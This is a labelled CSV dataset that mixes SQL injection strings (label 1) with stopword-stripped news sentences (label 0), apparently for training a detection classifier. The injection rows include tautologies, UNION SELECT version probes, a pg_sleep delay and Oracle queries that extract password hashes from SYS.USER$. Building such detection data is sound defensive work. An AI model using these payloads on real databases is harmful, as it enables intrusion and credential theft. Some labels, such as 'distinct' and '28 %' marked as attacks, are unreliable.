Sentence,Label
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
Tony Blair said &apos;d seize chance return Britain &apos;s prime minister - acknowledges comeback unlikely,0
"select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1",1
75 1970,0
"Persons seriously injured following collision Early Friday afternoon , two car drivers seriously injured head-on collision Landesstraße 44 (a rural road)",0
"select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1
Yet discontent multitude formidable senate college,0
"It &apos;s unclear , however , whether Obama knew team exploring swap",0
"In particular , planned major investments , debts thus affect parishes , cause great concern",0
The fact Africa lies closer many think means forgotten,0
"And: &apos; Without sound knowledge local language , even become lonely living dolce vita , &apos; added author , providing food thought seeking move abroad",0
"&quot; In terms handling , year hope break 3 million tonne mark , &quot; said Schrell",0
select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1,1
distinct,1
"select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",1
"This week Standard &amp; Poor &apos;s , rating agency , cited increasing household leverage , mainly rising mortgages , risk factor Asian banks &quot; creditworthiness",0
"Already stamp duty take residential property boroughs Westminster Kensington &amp; Chelsea , stood £ 708 million 2012 / 13 tax year , exceeds combined total Northern Ireland , Wales , Scotland , North East , North West Yorkshire Humber put together",0
"select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1",1
"There major problems , primarily terms covering counter attacking",0
"Our acts angels are, good ill, Our fatal shadows walk us still",0
"pdf 20170407112157Xyhcho 202 2020 203 204 20438 20648 20721304 214"" alt = ""time options"" title = ""time options s",0
"select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",1
"select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or ""{#"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1",1
Pam &apos;s blonde locks made famous role sexy TV show Baywatch,0
"select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1",1
"select * from users where id = 1.  union select 1,version (  )  -- 1",1
"select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1'",1
"Prime property - top 5% 10% housing market price - affluent south-west London belt , stretches Fulham Wimbledon , increased record 11",0
)  or  ( 'a' = 'a,1
"The police initially assumed multiple attackers , however , released two suspects custody evidence insufficient",0
"&quot; The problem poverty , &quot; Bwelle said",0
We afraid encourage intervention,0
( ||6 ),1
"An estimated one 2,000 children born year neither boy girl",0
"The Mayor considers right decision Winterlingen handed responsibility building someone else winter , thus longer pay upkeep building , heating , tending garden clearing pavement",0
1\'1,1
"&quot; In statement Thursday , representative Jagger , 70 , says &quot; categorically denies ever made pass Katy Perry",0
The complete background report found &quot; Allgäuer Anzeigeblatt &quot; newspaper dated 31 / 10 / 2013 (page 33),0
"&quot; We arrest individuals &apos;ve broken law , &quot; says government official",0
"&quot; That really delicious , &quot; said TV star conclusion",0
But next creation set even ambitious,0
28 %,1
Kenyan lawmakers target public anger past,0
"&quot; He &apos;t give , &quot; Ms Corteen said",0
"""  )  )   or pg_sleep ( __TIME__ ) --",1
"Other places hoping sell concept wary public devices , less",0
6 million Euro,0
&quot; Studies show English schools devote less time maths - 116 hours year three hours week term time - countries,0
"Mr Hare , started YMCA 21 , conceded management &quot; &quot; failed recruiting Lord failed make sure staff clear obligations report child safe policy breaches",0
"George Kerevan: Europe break-up gives Scots choice Another day , another independence scare story",0
"select * from users where id = 1 or 1#""; union select null,version (  )  -- 1",1
"I wish expiate, live",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
He said European leaders need honest people kind espionage programs &apos;ve used years,0
"There would threat diverted traffic country roads , already accident hotspots",0
", 2006b; Zhang Clark, 2008; Huang Sagae, 2010)",0
The &quot; Juice &quot; (Jupiter Icy Moons Explorer) probe planned begin journey 2022,0
That &apos;s lot ironic hotdog dogs,0
/flash/agency/buchun01,0
"select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1",1
"A contractual dispute Gazprom counterparts Ukraine , hosts Russia &apos;s gas Europe , adds layer risk conventional routes , officials say",0
"President , I &apos;t agree",0
hi' or 1 = 1 --,1
"The majority Americans - 158 million fact - celebrating Halloween year , spending total $ 6",0
' or 1 = 1,1
"There &apos;s increased social acceptance pawnbroking means secure short term , secured financing",0
"select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1",1
"select * from users where id = 1.  union select version (  ) ,version (  )  -- 1",1
"A kindergarten found private buyer &quot; The building good hands , &quot; said Winterlingen &apos;s Mayor Michael Maier",0
"The vast majority airliners qualify greater electronic device use new guidelines , Huerta said",0
"Further tests needed starting human trials , would take several years , Professor Ronald Crystal Weill Cornell Medical College New York said early signs good",0
or '1' = '1'--,1
"&quot; There lot tears year , &quot; Ms Corteen said",0
"Society joint-stock company, members agree, better securing bread shareholder, surrender liberty culture eater",0
It gives time tests figure period time write &apos; male &apos; &apos; female,0
The swallow window interweave thread straw carries bill web also,0
select * from users where id = 1 or \<$ or 1 = 1 -- 1,1
They assume bad things going happen prevent criminal thought turning action,0
"select * from users where id = 1 or ""?_"" or 1 = 1 -- 1",1
He added: &quot; We &apos;re dealing new world people willing blow,0
"select * from users where id = 1 union select @ $$,version (  )  -- 1",1
"Among requirements , towns municipalities applying subsidies must levy certain municipal rates",0
"On saying, What I sacredness traditions, I live wholly within? friend suggested, — But impulses may below, above",0
"Let us affront reprimand smooth mediocrity squalid contentment times, hurl face custom, trade, office, fact upshot history, great responsible Thinker Actor working wherever man works; true man belongs time place, centre things",0
"select * from users where id = 1 or ""@;"" = 1 or 1 = 1 -- 1",1
"They intersex , part group 60 conditions fall diagnosis disorders sexual development , umbrella term atypical chromosomes , gonads (ovaries testes), unusually developed genitalia",0
"select * from users where id = 1 or ""{?"" or 1 = 1 -- 1",1
"Even Germany , Eurosceptic Alternative Germany Party - founded year - came nowhere grab nearly five million votes September &apos;s federal elections , thus effectively knocking Free Democrats (equivalent Lib Dems) Bundestag",0
"If I firm enough to-day right, scorn eyes, I must done much right defend now",0
"&quot; The company radically unacceptably cutting back , despite price increase letters January 2013",0
or a  =  a,1
7bn £ 42,0
( select top 1,1
UEv,1
&quot; He running sand full length arena even though looked tiny marvellous job,0
something less official doctrine within White House,0
"However , always case existing apartment made age-appropriate therefore barrier-free , even beautiful ever",0
A complex planning approval procedure must completed,0
"It unclear much capacity Renamo , carried disruptive hit-and-run attacks police stations vehicles key north-south highway",0
select * from users where id = 1 <@ or 1 = 1 -- 1,1
"select * from users where id = 1 or 1#""{ union select 'a',version (  )  -- 1",1
"There monitored extent , order control income",0
"However , several planes could seen taking CNN",0
He Town Councillors clearly delighted good figures,0
As went turn right onto St,0
"select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""& ) "" or 1 = 1 -- 1",1
crude December delivery 14 cents $ 96,0
"Senate approved $ 90-million pilot project last year would involved 10,000 cars",0
They drove away,0
"She appointed outside monitor oversee major changes , including reforms policies , training supervision , ordered pilot program test body-worn cameras precincts stops occur",0
"Some largest tunnels discovered central Mexico &apos;s marijuana harvest October , presents drug cartels challenge quickly get product consumers",0
The cyber tactic relatively unsophisticated one attacks meant penetrate internal network target system,0
"The California woman plans challenge may first-of-its-kind citation , saying Internet-connected eyewear makes navigation easier",0
Bird airlifted safety North Sea rig released back wild A bird airlifted ashore found exhausted North Sea oil rig released back wild,0
"Mr Tripodi , ports minister February 2006 November 2009 , initially favour public tenders",0
And Toffee received top marks appearance personality,0
"select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'",1
"Charlie , founder &quot; Lick Me I &apos;m Delicious &quot; ice cream company , said: &quot; It incredible stuff still early days terms production , £ 200 gets 2g stuff",0
"&quot; We &apos;re pleased FAA recognizes enjoyable passenger experience incompatible safety security , &quot; said Roger Dow , CEO U",0
"The south stand , hand , loyal - loudest - BVB fans stand , initially unusually quiet: No singing battle cries",0
"select * from users where id = 1 or ""@ ) "" or 1 = 1 -- 1",1
select * from users where id = '1' or \<\. or 1 = 1 -- 1',1
